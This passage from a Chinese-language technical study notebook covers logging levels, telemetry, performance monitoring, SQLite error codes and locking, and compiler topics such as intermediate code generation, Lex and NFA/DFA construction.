<tr><td><strong>WARN</strong></td><td>4</td><td>是</td><td>业务进入了非预期的分支， 但是已经有保护代码，可以自动恢复业务逻辑。无需用户额外的干预。用户或者使用方可能感知不到。</td><td>请求时间超过指定阈值 guard else</td><td>5%</td></tr>
<tr><td><strong>ERROR</strong></td><td>5</td><td>是</td><td>业务出现了用户可以感知的错误， 无法在应用程序中自动恢复。  需要中断业务，通知用户。或者需要用户手动操作，结束业务。</td><td>try catch中的catch分支 assert中release时 应上报堆栈</td><td>5%</td></tr>
<tr><td><strong>FATAL</strong></td><td>6</td><td>是</td><td>有时也会用assert代替。</td><td></td><td>2%</td></tr>
</tbody></table>
</div>
<p>日志也是会引入额外的负担的。日志应该同时对人机友好，有足够信息。对人要便于阅读，对机器要便于筛选。</p>
<h2 id="埋点"><a class="header" href="#埋点">埋点</a></h2>
<p><strong>埋点</strong>是一个有趣的东西，他类似于日志，但是会通过网络向服务器进行报告。</p>
<p>仅对于某些特别重要的数据，或者是服务器希望收集统计的数据使用。</p>
<p>我们可以写些脚本来处理收集到的数据，比如将他们可视化。如果是这样的话，传递结构化的数据会更加方便，e.g. JSON和protobuf。</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="图形学"><a class="header" href="#图形学">图形学</a></h1>
<hr />
<p><a href="https://www.bilibili.com/video/BV1X7411F744?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&amp;vd_source=8dd4f0c3ff7b147787b6fdd76732fe43">Games 101</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="图像处理技术"><a class="header" href="#图像处理技术">图像处理技术</a></h1>
<hr />
<p><a href="https://codewords.recurse.com/issues/six/image-processing-101">Image Processing 101</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="视频"><a class="header" href="#视频">视频</a></h1>
<h3 id="数据如何传到显示器"><a class="header" href="#数据如何传到显示器">数据如何传到显示器</a></h3>
<p>Android使用的是Linux上主流图形渲染框架叫DRM(Direct Rendering Manager)，是一个内核级别的设备驱动，作用是解决多个3D程序同时访问GPU的冲突的问题，避免对GPU进行竞争。</p>
<p>DRM FrameBuffer是一块内存区域，用于绘制。和屏幕一般大，可以有不同的分辨率，不同的格式(YUV,RGB)</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="网络能力"><a class="header" href="#网络能力">网络能力</a></h1>
<p>如果客户端要和服务端交互的话，显然要通过网络。</p>
<p>客户端的网络能力，相比于服务端，不需要考虑高并发的情况，但是要考虑网络情况很差很复杂的情况。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="性能监控-1"><a class="header" href="#性能监控-1">性能监控</a></h1>
<p>监控的目的：</p>
<ol>
<li>衡量产品质量。</li>
<li>用数据指引优化方向，优化最需要优化的地方。</li>
<li>更早发现和修复问题。当完善了监控和报警体系的时候，可以自动化的发现问题。</li>
</ol>
<p>需要注意，监控性能的代码也需要消耗资源。</p>
<h2 id="for-function"><a class="header" href="#for-function">For function</a></h2>
<h3 id="easiest"><a class="header" href="#easiest">easiest</a></h3>
<p>最简单的方法是在函数的开头和结尾打上时间戳，然后相减。就知道函数的执行时间了。在编码的时候，使用元编程的方式记录函数使用时间是更加优雅的，因为他无关业务逻辑。具体的说，譬如Rust添加一个过程宏，或者Python中添加一个装饰器。</p>
<blockquote>
<p>请不要在异步函数这样做，得到的数据是没有意义的。。</p>
</blockquote>
<h2 id="for-machine"><a class="header" href="#for-machine">For machine</a></h2>
<p>对于Windows来说，可以在任务管理器查看CPU，内存等的使用情况。对于Linux来说，top是类似的东西。</p>
<h2 id="perfetto"><a class="header" href="#perfetto">Perfetto</a></h2>
<p>https://perfetto.dev/docs/</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="ios"><a class="header" href="#ios">iOS</a></h1>
<h2 id="语言基础"><a class="header" href="#语言基础">语言基础</a></h2>
<p>Objective- C Swift</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sqlite"><a class="header" href="#sqlite">SQLite</a></h1>
<h2 id="error"><a class="header" href="#error">Error</a></h2>
<p><a href="https://sqlite.org/c3ref/c_abort.html">错误码列表</a>，关于错误码更详细的解释可以参考<a href="https://www.sqlite.org/rescode.html">Result and Error Codes</a></p>
<p>SQLite的错误信息是保存在一个连接上的。<code>db-&gt;errCode</code>保存上一次的错误码，<code>db-&gt;pErr</code>保存上一次的错误消息。</p>
<blockquote>
<p>这个设计有一点奇怪，为什么要分开呢？是为了保存更详细的信息吗？</p>
<p>另外，例如你调用一个API，返回值是一个错误，但是他并不一定等于<code>db_errCode</code>，API的返回值不一定被存到了errCode。</p>
</blockquote>
<p>关于错误信息和错误码的对照关系，可以在<code>sqlite3ErrStr</code>函数中找到，如下。<code>database is locked</code>对应的错误是<code>SQLITE_BUSY</code>而不是<code>SQLITE_LOCKED</code>，非常坑爹。</p>
<pre><code class="language-c">    /* SQLITE_OK          */ &quot;not an error&quot;,
    /* SQLITE_ERROR       */ &quot;SQL logic error&quot;,
    /* SQLITE_INTERNAL    */ 0,
    /* SQLITE_PERM        */ &quot;access permission denied&quot;,
    /* SQLITE_ABORT       */ &quot;query aborted&quot;,
    /* SQLITE_BUSY        */ &quot;database is locked&quot;,
    /* SQLITE_LOCKED      */ &quot;database table is locked&quot;,
    /* SQLITE_NOMEM       */ &quot;out of memory&quot;,
    /* SQLITE_READONLY    */ &quot;attempt to write a readonly database&quot;,
    /* SQLITE_INTERRUPT   */ &quot;interrupted&quot;,
    /* SQLITE_IOERR       */ &quot;disk I/O error&quot;,
    /* SQLITE_CORRUPT     */ &quot;database disk image is malformed&quot;,
    /* SQLITE_NOTFOUND    */ &quot;unknown operation&quot;,
    /* SQLITE_FULL        */ &quot;database or disk is full&quot;,
    /* SQLITE_CANTOPEN    */ &quot;unable to open database file&quot;,
    /* SQLITE_PROTOCOL    */ &quot;locking protocol&quot;,
    /* SQLITE_EMPTY       */ 0,
    /* SQLITE_SCHEMA      */ &quot;database schema has changed&quot;,
    /* SQLITE_TOOBIG      */ &quot;string or blob too big&quot;,
    /* SQLITE_CONSTRAINT  */ &quot;constraint failed&quot;,
    /* SQLITE_MISMATCH    */ &quot;datatype mismatch&quot;,
    /* SQLITE_MISUSE      */ &quot;bad parameter or other API misuse&quot;,
#ifdef SQLITE_DISABLE_LFS
    /* SQLITE_NOLFS       */ &quot;large file support is disabled&quot;,
#else
    /* SQLITE_NOLFS       */ 0,
#endif
    /* SQLITE_AUTH        */ &quot;authorization denied&quot;,
    /* SQLITE_FORMAT      */ 0,
    /* SQLITE_RANGE       */ &quot;column index out of range&quot;,
    /* SQLITE_NOTADB      */ &quot;file is not a database&quot;,
    /* SQLITE_NOTICE      */ &quot;notification message&quot;,
    /* SQLITE_WARNING     */ &quot;warning message&quot;,
</code></pre>
<h3 id="sqlite_locked--sqlite_busy-1"><a class="header" href="#sqlite_locked--sqlite_busy-1">SQLITE_LOCKED &amp; SQLITE_BUSY <sup class="footnote-reference"><a href="#busy">1</a></sup></a></h3>
<p>简单的说，SQLITE_LOCKED的产生原因是同一个连接的冲突，SQLITE_BUSY的产生原因是两个连接的冲突。</p>
<p>冲突，类似于读写锁。SQLITE不支持并发的写，如果存在一个写其他的操作都需要等待。如果等待超过时间限制（<code>sqlite3_busy_timeout(db, limit)</code>可以设置限制），就会报错。</p>
<p>如果你的应用场景有很重的写并发，那么建议是不使用SQLite。而是使用其他的数据库比如MySQL/PostgreSQL。</p>
<div class="footnote-definition" id="busy"><sup class="footnote-definition-label">1</sup>
<p>https://www.sqlite.org/rescode.html#busy</p>
</div>
<h3 id="线程模型2"><a class="header" href="#线程模型2">线程模型<sup class="footnote-reference"><a href="#thread">2</a></sup></a></h3>
<ul>
<li>single-thread
<ul>
<li>coreMutex 和 fullMutex 都被禁用</li>
<li>用户层需要确保在任何时候只有一个线程访问 API，否则报错（crash）</li>
</ul>
</li>
<li>multi-thread
<ul>
<li>coreMutex 保留，fullMutex 禁用</li>
<li>可以多个线程基于不同的连接并发访问数据库，但单个连接在任何时候只能被一个线程访问</li>
<li>单个 connection，如果并发访问，会报错（crash）
<ul>
<li>报错信息：illegal multi-threaded access to database connection</li>
</ul>
</li>
</ul>
</li>
<li>serialized
<ul>
<li>coreMutex 和 fullMutex 都保留</li>
</ul>
</li>
</ul>
<div class="footnote-definition" id=" thread"><sup class="footnote-definition-label">3</sup>
<p><a href="https://www.sqlite.org/threadsafe.html">三种线程模型</a></p>
</div>
<h3 id="语句的执行阶段"><a class="header" href="#语句的执行阶段">语句的执行阶段</a></h3>
<p>The life-cycle of a <strong>prepared statement object(可以理解成SQL语句编译结果)</strong> usually goes like this:</p>
<ol>
<li>Create the prepared statement object using <a href="https://www.sqlite.org/c3ref/prepare.html"><code>sqlite3_prepare_v2()</code></a>. (编译SQL语句)</li>
<li>Bind values to <a href="https://www.sqlite.org/lang_expr.html#varparam">parameters</a> using the <code>sqlite3_bind_*()</code> interfaces. (绑定SQL语句的参数)</li>
<li>Run the SQL by calling <a href="https://www.sqlite.org/c3ref/step.html"><code>sqlite3_step()</code></a> one or more times. (执行SQL语句，这里可以把SQL的执行过程想象成状态机，step就是状态转移)</li>
<li>Reset the prepared statement using <a href="https://www.sqlite.org/c3ref/reset.html"><code>sqlite3_reset()</code></a> then go back to step 2. Do this zero or more times.</li>
<li>Destroy the object using <a href="https://www.sqlite.org/c3ref/finalize.html"><code>sqlite3_finalize()</code></a>.</li>
</ol>
<h3 id="事务-transaction"><a class="header" href="#事务-transaction">事务 Transaction</a></h3>
<p>事务是 SQL 数据库里的通用概念，它描述的是一个或一组数据库操作指令的执行单元；具有四个属性：原子性、一致性、隔离性、持久性，即所谓 <a href="https://en.wikipedia.org/wiki/ACID">ACID</a>。</p>
<p>任何的对数据库的读（SELECT）写（CREATE, DELETE, DROP, INSERT, UPDATE）操作都必须包含在事务中。事务是数据库操作的原子，理论上一个事务要么被全部执行（COMMIT），要么全部不执行（ROLLBACK）。</p>
<p>SQLite有三种事务类型<sup class="footnote-reference"><a href="#1">4</a></sup></p>
<ul>
<li><code>begin deferred ... end</code></li>
<li><code>begin immediate ... end</code></li>
<li><code>begin exclusive ... end</code></li>
</ul>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">4</sup>
<p>https://www.sqlite.org/lang_transaction.html </p>
</div>
<h2 id="日志模型"><a class="header" href="#日志模型">日志模型</a></h2>
<h3 id="rollback"><a class="header" href="#rollback">rollback</a></h3>
<p><img src="Basic/Client//Users/bytedance/Documents/note/images/1fd9e63f83da49378c513153caa82e3e~noop.png" alt="img" /></p>
<ol>
<li>初始状态，此时只有数据库文件</li>
<li>执行写事务，SQLite 检测到要修改 page 1 和 page 3；创建 .db-journal 文件，将 page 1 和 page 3 的内容拷贝到其中，作为备份</li>
<li>在数据库文件中直接修改</li>
<li>Commit 或者 Rollback（只能二选一）
<ol>
<li>提交修改，删除 .db-journal 文件</li>
<li>放弃修改，即回滚，使用 .db-journal 里的拷贝将数据库文件恢复到事务发生之前的模样</li>
</ol>
</li>
</ol>
<p>https://www.sqlite.org/atomiccommit.html</p>
<p><img src="Basic/Client//Users/bytedance/Documents/note/images/885988dc34e54ec19fbf5c8d16ba0e4b~noop.png" alt="img" /></p>
<p>对于锁逻辑有一个很好的介绍<sup class="footnote-reference"><a href="#2">5</a></sup></p>
<ul>
<li>.db 文件锁的初始状态是 unlocked</li>
<li>任何连接想要开启读操作，需要获取 shared 锁
<ul>
<li>可以有多个连接获取 shared 锁</li>
</ul>
</li>
<li>任何连接想要开启写操作，需要获取 reserved 锁
<ul>
<li>只能有一个连接获取 reserved 锁</li>
<li>获取到 reserved，transaction 可以写数据，但只是写在用户空间</li>
</ul>
</li>
<li>将修改的数据同步到数据库文件中（提交事务），需要获取 exclusive 锁
<ul>
<li>如果此时有连接在读数据，锁会变成 pending 状态，其他连接都退出读状态后，才进入 exclusive 状态</li>
<li>当文件锁处于 pending 状态，或者 exclusive 状态，表示磁盘中的 .db 文件即将或正在发生变化，此时是不可读的</li>
</ul>
</li>
</ul>
<div class="footnote-definition" id="2"><sup class="footnote-definition-label">5</sup>
<p><a href="https://activesphere.com/blog/2018/12/24/understanding-sqlite-busy">Understanding SQLITE_BUSY</a></p>
</div>
<h2 id="test6"><a class="header" href="#test6">Test<sup class="footnote-reference"><a href="#test">6</a></sup></a></h2>
<p>SQLite做到了100%的测试覆盖率。</p>
<div class="footnote-definition" id="test"><sup class="footnote-definition-label">6</sup>
<p>https://www.sqlite.org/testing.html</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="compiler"><a class="header" href="#compiler">Compiler</a></h1>
<p>大致的流程如下，忽略了代码优化的部分，代码的优化可以发生在各个阶段。</p>
<p><img src="Basic/Compiler/../images/compiler.drawio.svg" alt="" /></p>
<p>我觉得编译的精髓在于后端代码的生成和优化，不过学校考试的重点是前端。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="代码生成"><a class="header" href="#代码生成">代码生成</a></h1>
<p>代码生成的一般过程，是先生成中间代码，然后将中间代码翻译成真正的汇编代码。</p>
<h2 id="中间代码"><a class="header" href="#中间代码">中间代码</a></h2>
<h3 id="tac"><a class="header" href="#tac">TAC</a></h3>
<p>TAC (Three address code 三地址码)给人的感觉很像ARM/RISC-V汇编。如果需要表达<code>d = a + b - c</code>，那么对应的三地址码就是</p>
<pre><code>t1 = a + b
d = t1 - c
</code></pre>
<p>每个三地址码指令，都可以被分解为一个四元组（4-tuple）的形式：（运算符，操作数1，操作数2，结果）。三地址码另一个不同的实现是用自己的指令来代表临时变量，这样地址域从 3个减少到了两个。因此在三地址指令中包含3个地址而目标地址总是一个临时变量，这样就是三元组了。不过这样的话，操作数需要可以指向之前运算的结果。下面的<code>_</code>表示不需要这个操作数。</p>
<p>三地址码没有标准形式。如果要表达<code>2 * a + ( b - 3</code>，那对应的三地址码就类似</p>
<pre><code>t1 = b-3
t2 = 2*a
t3 = t2+t1
</code></pre>
<h3 id="p-code"><a class="header" href="#p-code">P code</a></h3>
<p>P code的感觉，就是一个栈架构的汇编代码，比如Python的字节码。操作数都是从栈顶pop出来的。如果要表达<code>2 * a + ( b - 3</code>，那对应的P code就类似</p>
<pre><code>ldc 2 ; load constant 2 
lod a ; load value of variable a
mpi   ; integer multiplication 
lod b ; load value of variable b
ldc 3 ; load constant 3 
sbi   ; integer substraction 
adi   ; integer addition
</code></pre>
<h3 id="二地址码"><a class="header" href="#二地址码">二地址码</a></h3>
<p>二地址码也是有用的，类似于x86的汇编。不过用的不多。</p>
<h2 id="基本的代码生成技术"><a class="header" href="#基本的代码生成技术">基本的代码生成技术</a></h2>
<p>中间代码生成(或没有中间代码的直接目标代码生成 )能被看作是一个<strong>属性计算</strong>，为每一个文法关联一个动作。我们可以遍历syntax tree来完成这个过程。从中间代码到目标代码的过程，一般有macro expansion和static simulation两种技术。</p>
<ul>
<li>macro expansion: 将每条中间代码翻译成对应的若干条目标代码。</li>
</ul>
<h3 id="数据结构的代码生成"><a class="header" href="#数据结构的代码生成">数据结构的代码生成，</a></h3>
<ul>
<li>
<p>对于三地址码，为了执行一些地址计算和指针引用，可以引入类似 C 语言的取值和取址操作符<code>&amp;</code>和<code>*</code>。以要生成<code>t1 = *(&amp;t2 + 1)</code>这个代码为例</p>
<pre><code>p = &amp;t2 + 1;
t1 = *p;
</code></pre>
<p>为了方便 数组访问，可以引入<code>[]=</code>和<code>=[]</code>形式的三地址码。<code>t = a[1]</code>我们认为是<code>(=[], a, 1, t)</code>而<code>a[1] = t</code>我们认为是<code>([]=, 1, t, a)</code>。</p>
</li>
<li>
<p>对于P Code，我们引入三条新指令</p>
<ul>
<li><code>ind</code> (间接装入)<img src="Basic/Compiler/../images/image-20220525201706099.png" alt="image-20220525201706099" style="zoom:50%;" /></li>
<li><code>ixa</code> (索引地址) <img src="Basic/Compiler/../images/image-20220525201718037.png" alt="image-20220525201718037" style="zoom:50%;" /></li>
<li><code>lda</code>(装入地址) 取操作数的地址，装入栈中</li>
</ul>
<p>以要生成<code>t1 = *(&amp;t2 + 1)</code>这个代码为例</p>
<pre><code>lda t2    ; load address of t2
ind 1     ; *(p+1)
lda t1    ; load address of t1
sto       ; *&amp;t1 = *(p+1)
</code></pre>
<p><code>t = a[1]</code>我们认为是</p>
<pre><code>lda t             ; load address of t
lda a             ; load address of a
ldc 1             ; load constant 1
ixa elem_size(a)  ; p = a + 1 * elem_size(a)
ind 0             ; *(p+0)
sto               ; *&amp;t = *(p+0)
</code></pre>
<p><code>a[1] = t</code>我们认为是</p>
<pre><code>lda a             ; load address of a
ldc 1             ; load constant 1
ixa elem_size(a)  ; p = a + 1 * elem_size(a)
lod t             ; load t
sto               ; *(p) = t
</code></pre>
</li>
</ul>
<h3 id="控制语句的代码生成"><a class="header" href="#控制语句的代码生成">控制语句的代码生成</a></h3>
<ul>
<li>
<p>对于三地址码，我们引入<code>goto</code>作为无条件跳转，引入<code>if-false...goto</code>作为有条件跳转（不知道为什么要是if-false）</p>
<p>对于<code>while(x) {}</code>的翻译，就是</p>
<pre><code>lable BEGIN
if-false (x) goto END
	&lt;code fot while&gt;
goto BEGIN
lable END
</code></pre>
</li>
<li>
<p>对于P code，我们引入<code>ujp</code>作为无条件跳转，引入<code>fjp</code>作为有条件跳转。</p>
<p>对于<code>while (x) {}</code>的翻译，就是</p>
<pre><code>lab L1
lod x
fjp L2
&lt;code for while&gt;
ujp L1
lab L2
</code></pre>
</li>
</ul>
<h3 id="函数调用的代码生成"><a class="header" href="#函数调用的代码生成">函数调用的代码生成</a></h3>
<p>这是很复杂的。函数调用，涉及参数的传递方式、跳转方式、返回值的返回方式。考虑下面函数声明和调用的代码</p>
<pre><code class="language-c">int f ( int x, int y )
{ 
    return x + y + 1; 
}

f(2+3, 4)
</code></pre>
<ul>
<li>
<p>对于三地址码</p>
<pre><code>entry f
t1 = x+y
t2 = t1+1
return t2

begin args
t1 = 2+3
arg t1
arg 4
call f
</code></pre>
</li>
<li>
<p>对于P code，引入<code>mst</code>，类似于三地址码的<code>begin args</code>，表示mark stack。<code>cup</code>类似<code>call</code>，表示call user process。</p>
<pre><code>ent f
lod x
lod y
adi
ldc 1
adi
ret

mst
ldc 2
ldc 3
adi
ldc 4
cup f
</code></pre>
</li>
</ul>
<h2 id="代码优化概览"><a class="header" href="#代码优化概览">代码优化概览</a></h2>
<h3 id="优化的主要来源"><a class="header" href="#优化的主要来源">优化的主要来源</a></h3>
<ol>
<li>Register allocation：</li>
<li>Unnecessary operations：这种优化的一种典型例子是代码中重复出现的表达式，而且它们的值相同，可以保存的第 1次的计算值并删除重复计算。</li>
<li>Costly operation substitution：比如把乘法变成位移和加法的组合。
<ol>
<li>Constant folding：比如把2+3用5进行代替。</li>
<li>Constant propagation：确定一个变量在程序局部或全程是否有恒定值，这样变换就可应用于涉及该变量的表达式</li>
<li>Inline function call：用过程体代替过程调用</li>
<li>Tail recursion removal：如果过程最后的操作是调用自身，等同过将新的调用参数赋给形式参数并转移到过程体的开始。</li>
</ol>
</li>
</ol>
<h3 id="优化的分类"><a class="header" href="#优化的分类">优化的分类</a></h3>
<p>考虑进行优化的阶段</p>
<ol>
<li>
<p><strong>Peephole optimization</strong>，窥孔优化。生成目标代码后在目标代码上进行优化；由于通常只能在局部优化所以得名。</p>
</li>
<li>
<p><strong>Target-level optimization</strong>，目标代码级优化。在生成目标代码前，结合目标机器的特性进行优化。</p>
</li>
<li>
<p><strong>Source-level optimization</strong>，源代码级优化。在生成目标代码前，以机器无关的方式进行优化</p>
</li>
</ol>
<p>考虑的是优化应用的程序范围：</p>
<ol>
<li>局部(local)优化，一个Basic block内。</li>
<li>全局(global)优化，一个函数内。</li>
<li>过程间(interprocedural)优化，函数间。</li>
</ol>
<h3 id="优化的数据结构和实现技术"><a class="header" href="#优化的数据结构和实现技术">优化的数据结构和实现技术</a></h3>
<p>优化离不开有向无环图DAG。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lex"><a class="header" href="#lex">Lex</a></h1>
<pre><code class="language-lex">声明部分
%%
转换规则
%%
辅助函数
</code></pre>
<p>声明部分包括明示常量。</p>
<p>转换规则为<code>模式 {动作}</code></p>
<h2 id="例子"><a class="header" href="#例子">例子</a></h2>
<pre><code class="language-c">%{
#include &lt;stdio.h&gt;
int num_lines =0, num_chars = 0, num_words = 0; 
char* ptr;
%}

COMMENT \{(.|\n)*\}
SEP     [ \t\n\(\)\[\]\.\+\*,/&lt;&gt;:;-=]
KEYWORD (and)|(array)|(begin)|(case)|(const)|(div)|(do)|(downto)|(else)|(end)|(for)|(function)|(goto)|(if)|(in)|(mod)|(not)|(of)|(or)|(packed)|(precedure)|(program)|(record)|(repeat)|(set)|(then)|(to)|(type)|(until)|(var)|(while)|(with)
VAR     [a-zA-Z_][a-zA-z0-9_]*
FLOAT   [0-9]+\.[0-9]+
INTEGER [0-9]+

%%
{COMMENT} {
    ptr = yytext;
    for (int i=0;i&lt;yyleng;i++,ptr++)
        fprintf(yyout,&quot;%c&quot;,*ptr);
}
{SEP}   {fprintf(yyout,&quot;%c&quot;,*yytext);}
{KEYWORD}     {
    ptr = yytext;
    for (int i=0;i&lt;yyleng;i++,ptr++)
        fprintf(yyout,&quot;%c&quot;,*ptr-32);
        
}
{VAR}|{FLOAT}|{INTEGER}  {
    ptr = yytext;
    for (int i=0;i&lt;yyleng;i++,ptr++)
        fprintf(yyout,&quot;%c&quot;,*ptr);
        
}
%%

int main() {
    yylex();
}
</code></pre>
<h2 id="内置的函数和变量"><a class="header" href="#内置的函数和变量">内置的函数和变量</a></h2>
<ul>
<li>yyin和yyout：这是Lex中已经定义的输入和输出文件指针。这两个变量指明了lex生成的词法分析器从哪里获取输入和输出到哪里。默认是标准输入（stdin）和标准输出（stdout）。</li>
<li>yytext：指向当前识别的词法单元（词文）的指针，即C里面的char*，一般可以直接用%s打印。</li>
<li>yyleng：当前词法单元的长度。</li>
<li>ECHO：Lex中预定义的宏，可以出现在（第二部分的）动作中，相当于fprintf(yyout, &quot;%s&quot;, yytext)，即输出当前匹配的词法单元。</li>
<li>yylex()：词法分析器驱动程序，用Lex翻译器生成的lex.yy.c内必然包含这个函数。</li>
<li>yywrap()：词法分析器遇到文件结尾时会调用yywrap()来决定下一步怎么做：若yywrap()返回0，则继续扫描，若返回1，则返回报告文件结尾的0标记。由于词法分析器总会调用yywrap，因此辅助寒素中最好提供yywrap，如果不提供，则在C编译器编译lex.yy.c时，需要链接相应的库，库中会给出标准的yywrap函数（标准函数返回1）。</li>
</ul>
<p><a href="http://niyanchun.com/lex-learning.html#d1">http://niyanchun.com/lex-learning.html#d1</a></p>
<h2 id="二义性的解决"><a class="header" href="#二义性的解决">二义性的解决</a></h2>
<p>Lex可能有二义性。当输入的多个前缀和一个或多个模式匹配时</p>
<ol>
<li>Lex总是选择最常的前缀</li>
<li>如果最长的可能前缀与多个模式匹配，总是选择被先列出的模式。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lexical-analyze"><a class="header" href="#lexical-analyze">Lexical Analyze</a></h1>
<p>Lexical Analyzer的主要任务是读入源程序的输入字符，将他们组成lexemes，生成并输出一个token序列（token和lexeme一一对应）。通常，这需要识别lexemes，过滤注释和空白。</p>
<p>Lexical Analyzer通常还要和Symbol table进行交互，发现标识符时添加到Symbol table。</p>
<p>有三个概念需要了解。<strong>alphabet</strong>是有限符号的集合。<strong>string</strong>是符号的有穷序列。<strong>language</strong>是给定alphabet上任意可数的string的集合。</p>
<h2 id="regular-expression-正则表达式"><a class="header" href="#regular-expression-正则表达式">Regular expression (正则表达式)</a></h2>
<p>正则表达式采用归纳定义：</p>
<ul>
<li>
<p>归纳基础：</p>
<ol>
<li>
<p>空串<code>ε</code>是一个正则表达式。<code>L(ε) = {ε}</code></p>
</li>
<li>
<p>若<code>a</code>是<code>∑</code>上的一个符号，那么a是一个正则表达式。<code>L(a) = {a}</code></p>
</li>
</ol>
</li>
<li>
<p>归纳步骤：如果r,s都是正则表达式，那么</p>
<ol>
<li><code>(r)|(s)</code> 是正则表达式，表示语言<code>L(r) ∪ L(s)</code></li>
<li><code>(r)(s)</code>是正则表达式，表示语言<code>L(r)L(s)</code></li>
<li><code>(r)*</code>是正则表达式，表示语言<code>(L(r))*</code></li>
<li><code>(r)</code>是一个正则表达式，表示语言<code>L(r)</code>，这是为了说明括号是没用的。</li>
</ol>
</li>
</ul>
<p>可以用正则表达式定义的language叫做regular set。为了避免不必要的括号，规定优先级的顺序是 <code>*</code> &gt; 连接 &gt; <code>|</code> 。</p>
<blockquote>
<p>正则表达式是存在局限性的，比如他没有计数的功能，他不能匹配类似<code>n个a b n个a</code>这样的串。</p>
</blockquote>
<h2 id="finite-automata-有穷自动机"><a class="header" href="#finite-automata-有穷自动机">Finite Automata (有穷自动机)</a></h2>
<p>有穷自动机分为两种：</p>
<ul>
<li>DFA (Deterministic Finite Automata): 对每一个<strong>状态和输入字符</strong>，有且只有一个<strong>下一个状态</strong>。</li>
<li>NFA (Non-Deterministic Finite Automata): 对于相同的当前状态和输入字符，下一个状态不一定是唯一的。</li>
</ul>
<p>举例：我们通常使用<strong>transition graph</strong>来表示有穷自动机。</p>
<p><img src="Basic/Compiler/../images/image-20210805193358750.png" alt="image-20210805193358750" /></p>
<ul>
<li>NFA和DFA具有<strong>等价性</strong>。对任何非确定的有穷自动机N ，存在定义同一language的确定的有穷自动机D，对任何确定的有穷自动机D ，存在定义同一language的非确定的有穷自动机N。</li>
<li>对于任何给定的DFA，都有一个含有最少量状态的等价的DFA，而且这个最小状态的DFA是唯一的。</li>
</ul>
<h3 id="re---nfa"><a class="header" href="#re---nfa">RE -&gt; NFA</a></h3>
<p>使用McMaughton-Yamada-Thompson算法。:star2:</p>
<ul>
<li>
<p>基本规则：</p>
<ul>
<li>和正则表达式<code>a</code>匹配的NFA为<img src="Basic/Compiler/../images/image-20220223191005706.png" alt="image-20220223191005706" style="zoom:25%;" />，</li>
<li><code>ε</code>类似。</li>
</ul>
</li>
<li>
<p>归纳规则：</p>
<ul>
<li>和<code>r|s</code>匹配的的NFA为<img src="Basic/Compiler/../images/image-20220223191217810.png" alt="image-20220223191217810" style="zoom:50%;" /></li>
<li>和<code>rs</code>匹配的NFA为<img src="Basic/Compiler/../images/image-20220223191255882.png" alt="image-20220223191255882" style="zoom:50%;" />，将<code>r</code>的结束状态置位<code>s</code>的初识状态（原版的算法中间还要再经过一次ε转换，虽然很没有必要，但是考试的话还是要写上）。</li>
<li>和<code>r*</code>匹配的NFA为<img src="Basic/Compiler/../images/image-20220223191347085.png" alt="image-20220223191347085" style="zoom:50%;" /></li>
<li>可以认为<code>r+</code>是<code>rr*</code>用上面的方法，更简单的是<img src="Basic/Compiler/../images/rp.png" style="zoom:80%;" /></li>
</ul>
</li>
</ul>
<h3 id="nfa---dfa"><a class="header" href="#nfa---dfa">NFA -&gt; DFA</a></h3>
<p>使用subset construction算法。</p>
<ul>
<li>
<p>首先了解三个重要的概念（集合），在下面的伪代码会把他们当做函数。</p>
<ul>
<li>状态的<code>ε-closure(s)</code>。由一个状态s出发，可以经过若干个<code>ε</code>转换能到达的状态的<strong>NFA状态集合</strong>。</li>
<li>状态集合的<code>ε-closure(T)</code>。从<strong>集合T中的</strong>某一个状态出发，可以经过若干个<code>ε</code>转换能到达的状态的<strong>NFA状态集合</strong>。</li>
<li><code>move(T, a)</code>。从集合T中的某个状态出发，可以通过<code>a</code>转换能够到达的<strong>NFA状态集合</strong>。</li>
</ul>
</li>
<li>
<p>然后是构造DFA状态转换图。<strong>DFA状态集合</strong>，记做<code>Dstates</code>（也就是图的点），<strong>DFA状态转换关系</strong>，记做<code>Dtran</code>（也就是图的边）。下面是该算法的<strong>Rust伪代码</strong>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let Dtran = map!();
let Dstates = set!(ε_closure(start),);
let untag = deque!(ε_closure(start),);
while !untag.is_empty() {
    let T = untag.pop_front();
    for symbol in alphabet {
        let U = ε_closure(move(T,symbol));
        if Dstate.insert(U) {		// DFA增加了一个状态
            untag.push_back(U);
        }
        Dtran.insert( (T,U) ) = a;	// 表示 T --a--&gt; U
    }
}
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
<!-- 因为当前状态+输入字符和下一个状态一一对应，所以即使在NFA中没有对应的输入（即下一个状态是空集），DFA中也应该创建一个状态来表示这个空状态。 -->
<h3 id="dfa---最简dfa"><a class="header" href="#dfa---最简dfa">DFA -&gt; 最简DFA</a></h3>
<ol>
<li>以最乐观的假设开始：创建两个集合，其中之一包含了所有的接受状态，而另一个则由所有的非接受状态组成。</li>
<li>对每个子集G，如果面对某个输入符号，里面的状态其中有两个的后继状态不属于同一个子集，则将G进一步划分。</li>
<li>重复②直到不再产生新划分。</li>
<li>在每个子集中选一个状态作代表，消去其他状态，得到最少状态的等价DFA M’。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="runtime"><a class="header" href="#runtime">Runtime</a></h1>
<p>运行时环境，大概可以分成下面三种，或者是下面三种的混合：</p>
<ol>
<li>完全静态的运行时环境。如被时代遗弃的Fortran77。</li>
<li>基于栈的运行时环境。如C/C++。</li>
<li>完全动态的运行时环境。</li>
</ol>
<h2 id="完全静态的运行时环境"><a class="header" href="#完全静态的运行时环境">完全静态的运行时环境</a></h2>
<p>最简单的运行时环境类型是所有数据都是静态的，且执行程序期间在存储器中保持固定。
这样的环境可用来实现没有指针或动态分配，且过程不可递归调用的语言。</p>
